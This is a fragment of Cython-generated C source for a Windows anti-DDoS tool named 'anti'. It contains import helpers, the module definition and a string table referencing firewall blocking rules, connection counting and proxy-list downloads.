        all = PyMapping_Keys(dict);
#endif
        Py_DECREF(dict);
        if (all == NULL)
            return -1;
        skip_leading_underscores = 1;
    }
    for (pos = 0, err = 0; ; pos++) {
        name = PySequence_GetItem(all, pos);
        if (name == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_IndexError))
                err = -1;
            else
                PyErr_Clear();
            break;
        }
        if (skip_leading_underscores &&
#if PY_MAJOR_VERSION < 3
            likely(PyString_Check(name)) &&
            PyString_AS_STRING(name)[0] == '_')
#else
            likely(PyUnicode_Check(name)) &&
            likely(__Pyx_PyUnicode_GET_LENGTH(name)) &&
            __Pyx_PyUnicode_READ_CHAR(name, 0) == '_')
#endif
        {
            Py_DECREF(name);
            continue;
        }
        value = PyObject_GetAttr(v, name);
        if (value == NULL)
            err = -1;
        else if (PyDict_CheckExact(locals))
            err = PyDict_SetItem(locals, name, value);
        else
            err = PyObject_SetItem(locals, name, value);
        Py_DECREF(name);
        Py_XDECREF(value);
        if (err != 0)
            break;
    }
    Py_DECREF(all);
    return err;
}
static int __pyx_import_star(PyObject* m) {
    int i;
    int ret = -1;
    char* s;
    PyObject* locals = 0;
    PyObject* list = 0;
#if PY_MAJOR_VERSION >= 3
    PyObject* utf8_name = 0;
#endif
    PyObject* name;
    PyObject* item;
    locals = PyDict_New();              if (!locals) goto bad;
    if (__Pyx_import_all_from(locals, m) < 0) goto bad;
    list = PyDict_Items(locals);        if (!list) goto bad;
    for (i = 0; i < PyList_GET_SIZE(list); i++) {
        name = PyTuple_GET_ITEM(PyList_GET_ITEM(list, i), 0);
        item = PyTuple_GET_ITEM(PyList_GET_ITEM(list, i), 1);
#if PY_MAJOR_VERSION >= 3
        utf8_name = PyUnicode_AsUTF8String(name);
        if (!utf8_name) goto bad;
        s = PyBytes_AS_STRING(utf8_name);
        if (__pyx_import_star_set(item, name, s) < 0) goto bad;
        Py_DECREF(utf8_name); utf8_name = 0;
#else
        s = PyString_AsString(name);
        if (!s) goto bad;
        if (__pyx_import_star_set(item, name, s) < 0) goto bad;
#endif
    }
    ret = 0;
bad:
    Py_XDECREF(locals);
    Py_XDECREF(list);
#if PY_MAJOR_VERSION >= 3
    Py_XDECREF(utf8_name);
#endif
    return ret;
}



#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject* spec, PyModuleDef* def);
static int __pyx_pymod_exec_anti(PyObject* module);
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_anti},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "anti",
    0,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0,
  #else
    - 1,
  #endif
    __pyx_methods,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots,
  #else
    NULL,
  #endif
    NULL,
    NULL,
    NULL
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
#define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
#define CYTHON_SMALL_CODE __attribute__((cold))
#else
#define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_0, __pyx_k_0, sizeof(__pyx_k_0), 0, 1, 0, 0},
  {&__pyx_kp_u_0_2, __pyx_k_0_2, sizeof(__pyx_k_0_2), 0, 1, 0, 0},
  {&__pyx_kp_u_1, __pyx_k_1, sizeof(__pyx_k_1), 0, 1, 0, 0},
  {&__pyx_kp_u_1_Anti_DDOS_Fake_Port_0_2_Remov, __pyx_k_1_Anti_DDOS_Fake_Port_0_2_Remov, sizeof(__pyx_k_1_Anti_DDOS_Fake_Port_0_2_Remov), 0, 1, 0, 0},
  {&__pyx_kp_u_2, __pyx_k_2, sizeof(__pyx_k_2), 0, 1, 0, 0},
  {&__pyx_kp_u_2_NUL, __pyx_k_2_NUL, sizeof(__pyx_k_2_NUL), 0, 1, 0, 0},
  {&__pyx_kp_u_3, __pyx_k_3, sizeof(__pyx_k_3), 0, 1, 0, 0},
  {&__pyx_kp_u_32, __pyx_k_32, sizeof(__pyx_k_32), 0, 1, 0, 0},
  {&__pyx_n_s_AF_INET, __pyx_k_AF_INET, sizeof(__pyx_k_AF_INET), 0, 0, 1, 1},
  {&__pyx_kp_u_Aborted_connection_Port_from, __pyx_k_Aborted_connection_Port_from, sizeof(__pyx_k_Aborted_connection_Port_from), 0, 1, 0, 0},
  {&__pyx_kp_u_Accept, __pyx_k_Accept, sizeof(__pyx_k_Accept), 0, 1, 0, 0},
  {&__pyx_kp_u_Are_you_sure_to_remove_all_block, __pyx_k_Are_you_sure_to_remove_all_block, sizeof(__pyx_k_Are_you_sure_to_remove_all_block), 0, 1, 0, 0},
  {&__pyx_kp_u_Blocked_connection_from_0, __pyx_k_Blocked_connection_from_0, sizeof(__pyx_k_Blocked_connection_from_0), 0, 1, 0, 0},
  {&__pyx_kp_u_Blocked_connection_from_0_1, __pyx_k_Blocked_connection_from_0_1, sizeof(__pyx_k_Blocked_connection_from_0_1), 0, 1, 0, 0},
  {&__pyx_n_s_CalledProcessError, __pyx_k_CalledProcessError, sizeof(__pyx_k_CalledProcessError), 0, 0, 1, 1},
  {&__pyx_kp_u_Close_connection_Port_from, __pyx_k_Close_connection_Port_from, sizeof(__pyx_k_Close_connection_Port_from), 0, 1, 0, 0},
  {&__pyx_kp_u_Closing_process, __pyx_k_Closing_process, sizeof(__pyx_k_Closing_process), 0, 1, 0, 0},
  {&__pyx_kp_u_Config_file_is_error, __pyx_k_Config_file_is_error, sizeof(__pyx_k_Config_file_is_error), 0, 1, 0, 0},
  {&__pyx_n_s_ConnectionAbortedError, __pyx_k_ConnectionAbortedError, sizeof(__pyx_k_ConnectionAbortedError), 0, 0, 1, 1},
  {&__pyx_n_s_ConnectionRefusedError, __pyx_k_ConnectionRefusedError, sizeof(__pyx_k_ConnectionRefusedError), 0, 0, 1, 1},
  {&__pyx_n_s_ConnectionResetError, __pyx_k_ConnectionResetError, sizeof(__pyx_k_ConnectionResetError), 0, 0, 1, 1},
  {&__pyx_kp_u_Connection_refused_Port_from, __pyx_k_Connection_refused_Port_from, sizeof(__pyx_k_Connection_refused_Port_from), 0, 1, 0, 0},
  {&__pyx_kp_b_Content_Length, __pyx_k_Content_Length, sizeof(__pyx_k_Content_Length), 0, 0, 0, 0},
  {&__pyx_n_s_DEVNULL, __pyx_k_DEVNULL, sizeof(__pyx_k_DEVNULL), 0, 0, 1, 1},
  {&__pyx_kp_u_DIED, __pyx_k_DIED, sizeof(__pyx_k_DIED), 0, 1, 0, 0},
  {&__pyx_kp_u_Detected_0_try_request_1_times, __pyx_k_Detected_0_try_request_1_times, sizeof(__pyx_k_Detected_0_try_request_1_times), 0, 1, 0, 0},
  {&__pyx_kp_u_Detected_DDOS_from_Blocking, __pyx_k_Detected_DDOS_from_Blocking, sizeof(__pyx_k_Detected_DDOS_from_Blocking), 0, 1, 0, 0},
  {&__pyx_kp_u_Downloading_Sock_Proxy, __pyx_k_Downloading_Sock_Proxy, sizeof(__pyx_k_Downloading_Sock_Proxy), 0, 1, 0, 0},
  {&__pyx_kp_u_ERROR_Port, __pyx_k_ERROR_Port, sizeof(__pyx_k_ERROR_Port), 0, 1, 0, 0},
  {&__pyx_kp_u_Facebook_Admin_is_error, __pyx_k_Facebook_Admin_is_error, sizeof(__pyx_k_Facebook_Admin_is_error), 0, 1, 0, 0},
  {&__pyx_kp_u_Found_proxy_txt_Note_Y_for_load, __pyx_k_Found_proxy_txt_Note_Y_for_load, sizeof(__pyx_k_Found_proxy_txt_Note_Y_for_load), 0, 1, 0, 0},
  {&__pyx_kp_u_GET, __pyx_k_GET, sizeof(__pyx_k_GET), 0, 1, 0, 0},
  {&__pyx_kp_b_HTTP_1_0_200_OK_Content_Type_tex, __pyx_k_HTTP_1_0_200_OK_Content_Type_tex, sizeof(__pyx_k_HTTP_1_0_200_OK_Content_Type_tex), 0, 0, 0, 0},
  {&__pyx_n_s_ImportError, __pyx_k_ImportError, sizeof(__pyx_k_ImportError), 0, 0, 1, 1},
  {&__pyx_kp_u_Input_Facebook_Admin, __pyx_k_Input_Facebook_Admin, sizeof(__pyx_k_Input_Facebook_Admin), 0, 1, 0, 0},
  {&__pyx_n_s_IsUserAnAdmin, __pyx_k_IsUserAnAdmin, sizeof(__pyx_k_IsUserAnAdmin), 0, 0, 1, 1},
  {&__pyx_n_s_KeyError, __pyx_k_KeyError, sizeof(__pyx_k_KeyError), 0, 0, 1, 1},
  {&__pyx_n_s_KeyboardInterrupt, __pyx_k_KeyboardInterrupt, sizeof(__pyx_k_KeyboardInterrupt), 0, 0, 1, 1},
  {&__pyx_n_u_KhanhNguyen9872, __pyx_k_KhanhNguyen9872, sizeof(__pyx_k_KhanhNguyen9872), 0, 1, 0, 1},
  {&__pyx_kp_u_KhanhNguyen9872_1_Facebook_2_You, __pyx_k_KhanhNguyen9872_1_Facebook_2_You, sizeof(__pyx_k_KhanhNguyen9872_1_Facebook_2_You), 0, 1, 0, 0},
  {&__pyx_n_u_N, __pyx_k_N, sizeof(__pyx_k_N), 0, 1, 0, 1},
  {&__pyx_kp_u_NOTE_Y_for_save_to_file_N_for_s, __pyx_k_NOTE_Y_for_save_to_file_N_for_s, sizeof(__pyx_k_NOTE_Y_for_save_to_file_N_for_s), 0, 1, 0, 0},
  {&__pyx_n_u_No, __pyx_k_No, sizeof(__pyx_k_No), 0, 1, 0, 1},
  {&__pyx_kp_u_No_DDOS_in_seconds_reset_count, __pyx_k_No_DDOS_in_seconds_reset_count, sizeof(__pyx_k_No_DDOS_in_seconds_reset_count), 0, 1, 0, 0},
  {&__pyx_kp_u_OK_IP, __pyx_k_OK_IP, sizeof(__pyx_k_OK_IP), 0, 1, 0, 0},
  {&__pyx_n_s_OSError, __pyx_k_OSError, sizeof(__pyx_k_OSError), 0, 0, 1, 1},
  {&__pyx_n_s_PIPE, __pyx_k_PIPE, sizeof(__pyx_k_PIPE), 0, 0, 1, 1},
  {&__pyx_n_s_PermissionError, __pyx_k_PermissionError, sizeof(__pyx_k_PermissionError), 0, 0, 1, 1},
  {&__pyx_n_s_Popen, __pyx_k_Popen, sizeof(__pyx_k_Popen), 0, 0, 1, 1},
  {&__pyx_kp_u_Port, __pyx_k_Port, sizeof(__pyx_k_Port), 0, 1, 0, 0},
  {&__pyx_kp_u_Press_Enter_to_Exit, __pyx_k_Press_Enter_to_Exit, sizeof(__pyx_k_Press_Enter_to_Exit), 0, 1, 0, 0},
  {&__pyx_kp_u_Press_Enter_to_Exit_2, __pyx_k_Press_Enter_to_Exit_2, sizeof(__pyx_k_Press_Enter_to_Exit_2), 0, 1, 0, 0},
  {&__pyx_kp_u_Press_Enter_to_Start, __pyx_k_Press_Enter_to_Start, sizeof(__pyx_k_Press_Enter_to_Start), 0, 1, 0, 0},
  {&__pyx_kp_u_Processing_IP, __pyx_k_Processing_IP, sizeof(__pyx_k_Processing_IP), 0, 1, 0, 0},
  {&__pyx_kp_u_Real_IP_Sock_IP, __pyx_k_Real_IP_Sock_IP, sizeof(__pyx_k_Real_IP_Sock_IP), 0, 1, 0, 0},
  {&__pyx_kp_u_Remove_All_Block_IP_from_Port_co, __pyx_k_Remove_All_Block_IP_from_Port_co, sizeof(__pyx_k_Remove_All_Block_IP_from_Port_co), 0, 1, 0, 0},
  {&__pyx_n_s_SHUT_RD, __pyx_k_SHUT_RD, sizeof(__pyx_k_SHUT_RD), 0, 0, 1, 1},
  {&__pyx_n_s_SHUT_WR, __pyx_k_SHUT_WR, sizeof(__pyx_k_SHUT_WR), 0, 0, 1, 1},
  {&__pyx_n_s_SIGABRT, __pyx_k_SIGABRT, sizeof(__pyx_k_SIGABRT), 0, 0, 1, 1},
  {&__pyx_n_s_SIGKILL, __pyx_k_SIGKILL, sizeof(__pyx_k_SIGKILL), 0, 0, 1, 1},
  {&__pyx_n_u_SIGKILL, __pyx_k_SIGKILL, sizeof(__pyx_k_SIGKILL), 0, 1, 0, 1},
  {&__pyx_n_s_SOCK_STREAM, __pyx_k_SOCK_STREAM, sizeof(__pyx_k_SOCK_STREAM), 0, 0, 1, 1},
  {&__pyx_n_s_ShellExecuteW, __pyx_k_ShellExecuteW, sizeof(__pyx_k_ShellExecuteW), 0, 0, 1, 1},
  {&__pyx_kp_u_Started_KhanhNguyen9872, __pyx_k_Started_KhanhNguyen9872, sizeof(__pyx_k_Started_KhanhNguyen9872), 0, 1, 0, 0},
  {&__pyx_kp_u_Starting_Anti_DDOS, __pyx_k_Starting_Anti_DDOS, sizeof(__pyx_k_Starting_Anti_DDOS), 0, 1, 0, 0},
  {&__pyx_kp_u_This_tool_work_only_on_Windows, __pyx_k_This_tool_work_only_on_Windows, sizeof(__pyx_k_This_tool_work_only_on_Windows), 0, 1, 0, 0},
  {&__pyx_n_s_Thread, __pyx_k_Thread, sizeof(__pyx_k_Thread), 0, 0, 1, 1},
  {&__pyx_n_s_TimeoutError, __pyx_k_TimeoutError, sizeof(__pyx_k_TimeoutError), 0, 0, 1, 1},
  {&__pyx_kp_u_Timeout_Port_from, __pyx_k_Timeout_Port_from, sizeof(__pyx_k_Timeout_Port_from), 0, 1, 0, 0},
  {&__pyx_kp_u_Total_IP_Sock_IP, __pyx_k_Total_IP_Sock_IP, sizeof(__pyx_k_Total_IP_Sock_IP), 0, 1, 0, 0},
  {&__pyx_n_u_Y, __pyx_k_Y, sizeof(__pyx_k_Y), 0, 1, 0, 1},
  {&__pyx_kp_u_Your_choose, __pyx_k_Your_choose, sizeof(__pyx_k_Your_choose), 0, 1, 0, 0},
  {&__pyx_kp_u__10, __pyx_k__10, sizeof(__pyx_k__10), 0, 1, 0, 0},
  {&__pyx_kp_u__11, __pyx_k__11, sizeof(__pyx_k__11), 0, 1, 0, 0},
  {&__pyx_kp_u__13, __pyx_k__13, sizeof(__pyx_k__13), 0, 1, 0, 0},
  {&__pyx_kp_u__15, __pyx_k__15, sizeof(__pyx_k__15), 0, 1, 0, 0},
  {&__pyx_kp_b__16, __pyx_k__16, sizeof(__pyx_k__16), 0, 0, 0, 0},
  {&__pyx_kp_u__16, __pyx_k__16, sizeof(__pyx_k__16), 0, 1, 0, 0},
  {&__pyx_kp_u__19, __pyx_k__19, sizeof(__pyx_k__19), 0, 1, 0, 0},
  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},
  {&__pyx_kp_u__20, __pyx_k__20, sizeof(__pyx_k__20), 0, 1, 0, 0},
  {&__pyx_kp_u__21, __pyx_k__21, sizeof(__pyx_k__21), 0, 1, 0, 0},
  {&__pyx_kp_u__22, __pyx_k__22, sizeof(__pyx_k__22), 0, 1, 0, 0},
  {&__pyx_kp_u__3, __pyx_k__3, sizeof(__pyx_k__3), 0, 1, 0, 0},
  {&__pyx_n_s__38, __pyx_k__38, sizeof(__pyx_k__38), 0, 0, 1, 1},
  {&__pyx_kp_u__5, __pyx_k__5, sizeof(__pyx_k__5), 0, 1, 0, 0},
  {&__pyx_n_s__53, __pyx_k__53, sizeof(__pyx_k__53), 0, 0, 1, 1},
  {&__pyx_kp_u__55, __pyx_k__55, sizeof(__pyx_k__55), 0, 1, 0, 0},
  {&__pyx_kp_u__62, __pyx_k__62, sizeof(__pyx_k__62), 0, 1, 0, 0},
  {&__pyx_kp_u__63, __pyx_k__63, sizeof(__pyx_k__63), 0, 1, 0, 0},
  {&__pyx_kp_u__7, __pyx_k__7, sizeof(__pyx_k__7), 0, 1, 0, 0},
  {&__pyx_kp_u__8, __pyx_k__8, sizeof(__pyx_k__8), 0, 1, 0, 0},
  {&__pyx_kp_u__9, __pyx_k__9, sizeof(__pyx_k__9), 0, 1, 0, 0},
  {&__pyx_n_s_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 0, 1, 1},
  {&__pyx_n_u_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 1, 0, 1},
  {&__pyx_n_s_about, __pyx_k_about, sizeof(__pyx_k_about), 0, 0, 1, 1},
  {&__pyx_n_s_accept, __pyx_k_accept, sizeof(__pyx_k_accept), 0, 0, 1, 1},
  {&__pyx_n_s_add_ip_rule, __pyx_k_add_ip_rule, sizeof(__pyx_k_add_ip_rule), 0, 0, 1, 1},
  {&__pyx_n_s_anti, __pyx_k_anti, sizeof(__pyx_k_anti), 0, 0, 1, 1},
  {&__pyx_kp_s_anti_py, __pyx_k_anti_py, sizeof(__pyx_k_anti_py), 0, 0, 1, 0},
  {&__pyx_n_s_append, __pyx_k_append, sizeof(__pyx_k_append), 0, 0, 1, 1},
  {&__pyx_n_s_args, __pyx_k_args, sizeof(__pyx_k_args), 0, 0, 1, 1},
  {&__pyx_n_s_argv, __pyx_k_argv, sizeof(__pyx_k_argv), 0, 0, 1, 1},
  {&__pyx_n_u_ascii, __pyx_k_ascii, sizeof(__pyx_k_ascii), 0, 1, 0, 1},
  {&__pyx_n_s_b, __pyx_k_b, sizeof(__pyx_k_b), 0, 0, 1, 1},
  {&__pyx_n_s_ban_ip, __pyx_k_ban_ip, sizeof(__pyx_k_ban_ip), 0, 0, 1, 1},
  {&__pyx_n_s_ban_sock, __pyx_k_ban_sock, sizeof(__pyx_k_ban_sock), 0, 0, 1, 1},
  {&__pyx_n_s_bind, __pyx_k_bind, sizeof(__pyx_k_bind), 0, 0, 1, 1},
  {&__pyx_n_s_block, __pyx_k_block, sizeof(__pyx_k_block), 0, 0, 1, 1},
  {&__pyx_n_s_block_ip, __pyx_k_block_ip, sizeof(__pyx_k_block_ip), 0, 0, 1, 1},
  {&__pyx_kp_u_block_ip_txt, __pyx_k_block_ip_txt, sizeof(__pyx_k_block_ip_txt), 0, 1, 0, 0},
  {&__pyx_n_s_block_on_count, __pyx_k_block_on_count, sizeof(__pyx_k_block_on_count), 0, 0, 1, 1},
  {&__pyx_n_s_blockk, __pyx_k_blockk, sizeof(__pyx_k_blockk), 0, 0, 1, 1},
  {&__pyx_kp_u_blockk_2, __pyx_k_blockk_2, sizeof(__pyx_k_blockk_2), 0, 1, 0, 0},
  {&__pyx_kp_u_br_br, __pyx_k_br_br, sizeof(__pyx_k_br_br), 0, 1, 0, 0},
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_kp_u_cannot_be_spoof_Need_administra, __pyx_k_cannot_be_spoof_Need_administra, sizeof(__pyx_k_cannot_be_spoof_Need_administra), 0, 1, 0, 0},
  {&__pyx_n_s_check_output, __pyx_k_check_output, sizeof(__pyx_k_check_output), 0, 0, 1, 1},
  {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},
  {&__pyx_n_s_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
  {&__pyx_n_u_cls, __pyx_k_cls, sizeof(__pyx_k_cls), 0, 1, 0, 1},
  {&__pyx_n_s_con_ip, __pyx_k_con_ip, sizeof(__pyx_k_con_ip), 0, 0, 1, 1},
  {&__pyx_n_s_config, __pyx_k_config, sizeof(__pyx_k_config), 0, 0, 1, 1},
  {&__pyx_kp_u_config_fake_0_1_2_3, __pyx_k_config_fake_0_1_2_3, sizeof(__pyx_k_config_fake_0_1_2_3), 0, 1, 0, 0},
  {&__pyx_kp_u_config_py_not_found_or_syntax_e, __pyx_k_config_py_not_found_or_syntax_e, sizeof(__pyx_k_config_py_not_found_or_syntax_e), 0, 1, 0, 0},
  {&__pyx_n_s_conn, __pyx_k_conn, sizeof(__pyx_k_conn), 0, 0, 1, 1},
  {&__pyx_n_s_connect, __pyx_k_connect, sizeof(__pyx_k_connect), 0, 0, 1, 1},
  {&__pyx_n_s_content_length, __pyx_k_content_length, sizeof(__pyx_k_content_length), 0, 0, 1, 1},
  {&__pyx_n_s_count, __pyx_k_count, sizeof(__pyx_k_count), 0, 0, 1, 1},
  {&__pyx_n_s_count_ip, __pyx_k_count_ip, sizeof(__pyx_k_count_ip), 0, 0, 1, 1},
  {&__pyx_n_s_create_rule, __pyx_k_create_rule, sizeof(__pyx_k_create_rule), 0, 0, 1, 1},
  {&__pyx_n_s_ctypes, __pyx_k_ctypes, sizeof(__pyx_k_ctypes), 0, 0, 1, 1},
  {&__pyx_kp_u_curl_exe_H_User_Agent_1_k_L_max, __pyx_k_curl_exe_H_User_Agent_1_k_L_max, sizeof(__pyx_k_curl_exe_H_User_Agent_1_k_L_max), 0, 1, 0, 0},
  {&__pyx_n_s_ddos, __pyx_k_ddos, sizeof(__pyx_k_ddos), 0, 0, 1, 1},
  {&__pyx_n_s_decode, __pyx_k_decode, sizeof(__pyx_k_decode), 0, 0, 1, 1},
  {&__pyx_n_s_destination, __pyx_k_destination, sizeof(__pyx_k_destination), 0, 0, 1, 1},
  {&__pyx_n_s_devnull, __pyx_k_devnull, sizeof(__pyx_k_devnull), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_end, __pyx_k_end, sizeof(__pyx_k_end), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_exec_sys, __pyx_k_exec_sys, sizeof(__pyx_k_exec_sys), 0, 0, 1, 1},
  {&__pyx_n_s_executable, __pyx_k_executable, sizeof(__pyx_k_executable), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
  {&__pyx_n_s_flush, __pyx_k_flush, sizeof(__pyx_k_flush), 0, 0, 1, 1},
  {&__pyx_n_s_force_block, __pyx_k_force_block, sizeof(__pyx_k_force_block), 0, 0, 1, 1},
  {&__pyx_n_s_force_firewall_count, __pyx_k_force_firewall_count, sizeof(__pyx_k_force_firewall_count), 0, 0, 1, 1},
  {&__pyx_n_s_format, __pyx_k_format, sizeof(__pyx_k_format), 0, 0, 1, 1},
  {&__pyx_n_s_forward, __pyx_k_forward, sizeof(__pyx_k_forward), 0, 0, 1, 1},
  {&__pyx_n_s_get_fb, __pyx_k_get_fb, sizeof(__pyx_k_get_fb), 0, 0, 1, 1},
  {&__pyx_n_s_getpid, __pyx_k_getpid, sizeof(__pyx_k_getpid), 0, 0, 1, 1},
  {&__pyx_kp_u_global_blockk, __pyx_k_global_blockk, sizeof(__pyx_k_global_blockk), 0, 1, 0, 0},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_s_host_fake, __pyx_k_host_fake, sizeof(__pyx_k_host_fake), 0, 0, 1, 1},
  {&__pyx_n_s_host_real, __pyx_k_host_real, sizeof(__pyx_k_host_real), 0, 0, 1, 1},
  {&__pyx_kp_u_https_fb_me_khanh10a1, __pyx_k_https_fb_me_khanh10a1, sizeof(__pyx_k_https_fb_me_khanh10a1), 0, 1, 0, 0},
  {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_s_ip, __pyx_k_ip, sizeof(__pyx_k_ip), 0, 0, 1, 1},
  {&__pyx_n_s_is_admin, __pyx_k_is_admin, sizeof(__pyx_k_is_admin), 0, 0, 1, 1},
  {&__pyx_n_s_is_get_sock, __pyx_k_is_get_sock, sizeof(__pyx_k_is_get_sock), 0, 0, 1, 1},
  {&__pyx_n_s_khanh, __pyx_k_khanh, sizeof(__pyx_k_khanh), 0, 0, 1, 1},
  {&__pyx_n_s_kill, __pyx_k_kill, sizeof(__pyx_k_kill), 0, 0, 1, 1},
  {&__pyx_n_s_kill_process, __pyx_k_kill_process, sizeof(__pyx_k_kill_process), 0, 0, 1, 1},
  {&__pyx_n_s_list_ban_ip, __pyx_k_list_ban_ip, sizeof(__pyx_k_list_ban_ip), 0, 0, 1, 1},
  {&__pyx_n_s_listen, __pyx_k_listen, sizeof(__pyx_k_listen), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_u_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 1, 0, 1},
  {&__pyx_n_u_n, __pyx_k_n, sizeof(__pyx_k_n), 0, 1, 0, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_kp_u_netsh_advfirewall_firewall_add_r, __pyx_k_netsh_advfirewall_firewall_add_r, sizeof(__pyx_k_netsh_advfirewall_firewall_add_r), 0, 1, 0, 0},
  {&__pyx_kp_u_netsh_advfirewall_firewall_delet, __pyx_k_netsh_advfirewall_firewall_delet, sizeof(__pyx_k_netsh_advfirewall_firewall_delet), 0, 1, 0, 0},
  {&__pyx_kp_u_netsh_advfirewall_firewall_set_r, __pyx_k_netsh_advfirewall_firewall_set_r, sizeof(__pyx_k_netsh_advfirewall_firewall_set_r), 0, 1, 0, 0},
  {&__pyx_kp_u_netsh_advfirewall_firewall_set_r_2, __pyx_k_netsh_advfirewall_firewall_set_r_2, sizeof(__pyx_k_netsh_advfirewall_firewall_set_r_2), 0, 1, 0, 0},
  {&__pyx_kp_u_netsh_advfirewall_firewall_show, __pyx_k_netsh_advfirewall_firewall_show, sizeof(__pyx_k_netsh_advfirewall_firewall_show), 0, 1, 0, 0},
  {&__pyx_n_u_nt, __pyx_k_nt, sizeof(__pyx_k_nt), 0, 1, 0, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_open_port, __pyx_k_open_port, sizeof(__pyx_k_open_port), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_payload, __pyx_k_payload, sizeof(__pyx_k_payload), 0, 0, 1, 1},
  {&__pyx_n_s_pid, __pyx_k_pid, sizeof(__pyx_k_pid), 0, 0, 1, 1},
  {&__pyx_n_s_port, __pyx_k_port, sizeof(__pyx_k_port), 0, 0, 1, 1},
  {&__pyx_n_s_port_fake, __pyx_k_port_fake, sizeof(__pyx_k_port_fake), 0, 0, 1, 1},
  {&__pyx_n_s_port_real, __pyx_k_port_real, sizeof(__pyx_k_port_real), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_kp_u_proxy_txt, __pyx_k_proxy_txt, sizeof(__pyx_k_proxy_txt), 0, 1, 0, 0},
  {&__pyx_n_u_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 1, 0, 1},
  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
  {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
  {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
  {&__pyx_n_s_recv, __pyx_k_recv, sizeof(__pyx_k_recv), 0, 0, 1, 1},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_remove_block, __pyx_k_remove_block, sizeof(__pyx_k_remove_block), 0, 0, 1, 1},
  {&__pyx_n_s_replace, __pyx_k_replace, sizeof(__pyx_k_replace), 0, 0, 1, 1},
  {&__pyx_n_s_request, __pyx_k_request, sizeof(__pyx_k_request), 0, 0, 1, 1},
  {&__pyx_n_s_reset_on_time, __pyx_k_reset_on_time, sizeof(__pyx_k_reset_on_time), 0, 0, 1, 1},
  {&__pyx_n_u_runas, __pyx_k_runas, sizeof(__pyx_k_runas), 0, 1, 0, 1},
  {&__pyx_n_s_sendall, __pyx_k_sendall, sizeof(__pyx_k_sendall), 0, 0, 1, 1},
  {&__pyx_n_s_server_socket, __pyx_k_server_socket, sizeof(__pyx_k_server_socket), 0, 0, 1, 1},
  {&__pyx_n_s_shell, __pyx_k_shell, sizeof(__pyx_k_shell), 0, 0, 1, 1},
  {&__pyx_n_s_shell32, __pyx_k_shell32, sizeof(__pyx_k_shell32), 0, 0, 1, 1},
  {&__pyx_n_s_shutdown, __pyx_k_shutdown, sizeof(__pyx_k_shutdown), 0, 0, 1, 1},
  {&__pyx_n_s_signal, __pyx_k_signal, sizeof(__pyx_k_signal), 0, 0, 1, 1},
  {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
  {&__pyx_n_s_soc, __pyx_k_soc, sizeof(__pyx_k_soc), 0, 0, 1, 1},
  {&__pyx_n_s_sock, __pyx_k_sock, sizeof(__pyx_k_sock), 0, 0, 1, 1},
